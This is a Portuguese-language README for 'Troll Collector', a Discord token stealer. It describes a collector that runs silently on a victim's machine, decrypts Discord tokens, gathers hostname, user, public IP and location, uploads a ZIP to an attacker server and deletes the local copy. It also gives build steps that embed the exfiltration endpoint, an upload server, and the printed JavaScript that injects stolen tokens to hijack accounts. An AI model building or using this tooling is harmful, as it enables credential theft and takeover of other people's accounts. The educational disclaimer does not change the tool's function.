# Troll Collector

Ferramenta de coleta e injeção de tokens Discord para fins de estudo e pentest em ambientes controlados.

---

## Estrutura do Projeto

```
collector/
├── main.cpp              # Lógica principal do collector
├── discord.cpp/.h        # Extração de tokens do LevelDB do Discord
├── sysinfo.cpp/.h        # Coleta de informações do sistema
├── zip_writer.cpp/.h     # Geração do ZIP de saída
├── pch.h                 # Precompiled headers
├── launcher.cpp          # Discord Launcher (injeção de token via Edge)
├── resources.rc          # Embed do launcher no collector
├── build.bat             # Build completo (collector + launcher embutido)
├── build_launcher.bat    # Build standalone do launcher
└── endpoint.h            # Gerado automaticamente pelo build.bat
```

---

## Como Compilar

### Pré-requisitos

- **Visual Studio 2022+** com ferramentas C++ para Desktop
- **Windows SDK**

### Build completo

```bat
.\build.bat http://SEU_SERVIDOR:PORTA/ROTA
```

Exemplo:
```bat
.\build.bat https://meuservidor.onrender.com/profile
```

O endpoint é **embutido** no `collector.exe` em tempo de compilação via `endpoint.h`.

### Build standalone do launcher

```bat
.\build_launcher.bat
```

---

## Fluxo de Uso

```
[ALVO]                          [ATACANTE]
  │                                  │
  │  Executa collector.exe           │
  │  ──────────────────────────────► │
  │  - Coleta tokens Discord         │
  │  - Coleta sysinfo                │
  │  - Gera ZIP                      │
  │  - Envia para servidor ──────────┤
  │  - Deleta ZIP local              │  servidor/uploads/
  │                                  │  └── collector_YYYYMMDD.zip
  │                              Baixa ZIP
  │                              Extrai discord.txt
  │                              Roda discord_launcher.exe
  │                                  │
  │                              Edge abre discord.com/channels/@me
  │                              F12 → Digita JS → Injeta token
  │                              Faz login na conta alvo ✓
```

---

## collector.exe

Roda silenciosamente na máquina alvo.

**O que coleta:**
| Arquivo no ZIP | Conteúdo |
|---|---|
| `discord.txt` | Tokens Discord descriptografados |
| `sysinfo.txt` | Hostname, usuário, SO, IP público, localização |
| `discord_launcher.exe` | Launcher embutido (pronto para uso) |

**Comportamento:**
- Não deixa ZIP no disco após envio bem-sucedido
- Fallback: salva ZIP localmente se o servidor estiver offline
- Suporte a `--diagnose` para debug do LevelDB

```bat
collector.exe --diagnose
```

---

## discord_launcher.exe

Roda na **máquina do atacante** após receber o ZIP.

**Uso:**
1. Extraia o ZIP recebido no servidor
2. Coloque `discord.txt` e `discord_launcher.exe` na mesma pasta
3. Execute `discord_launcher.exe`

**Fluxo interativo:**
```
[*] 2 token(s) encontrado(s)
    NAO mexa no teclado/mouse durante a injecao (~10s)

[1/2] Token: MTQzMDQwNjk0MTYxMTM5Nz...
  -> Aguardando carregamento (5s)...
  -> Abrindo DevTools (F12)...
  -> Digitando JS...
  -> Injetado! Aguardando reload (4s)...
[?] Fez login na conta alvo? (s/n): n
[!] Token [1] nao funcionou. Fechando Edge e tentando proximo...

[2/2] Token: NzE0MDI5Njc0NzI0...
[?] Fez login na conta alvo? (s/n): s
[OK] Token [2] funcionou!
```

---

## Servidor de Recebimento

O projeto usa um servidor Node.js + Express + Multer.

**Rota de upload:** `POST /profile` (campo `file`)  
**Listar arquivos:** `GET /files`  
**Download:** `GET /download/:filename`

```bash
cd server/
npm install
node server.js
```

Arquivos ficam em `uploads/`.

---

## Como o Token é Injetado

```javascript
setInterval(() => {
  document.body.appendChild(document.createElement('iframe'))
    .contentWindow.localStorage.token = '"TOKEN"'
}, 50);

setTimeout(() => { location.reload(); }, 2500);
```

Executado via DevTools Console digitando caractere por caractere (`SendInput` Unicode) — sem clipboard, sem paste.

---

## Aviso Legal

> Este projeto é desenvolvido exclusivamente para fins educacionais e de pesquisa em segurança.  
> O uso em sistemas sem autorização explícita do proprietário é **ilegal** e sujeito às penalidades previstas em lei.  
> O autor não se responsabiliza por qualquer uso indevido desta ferramenta.
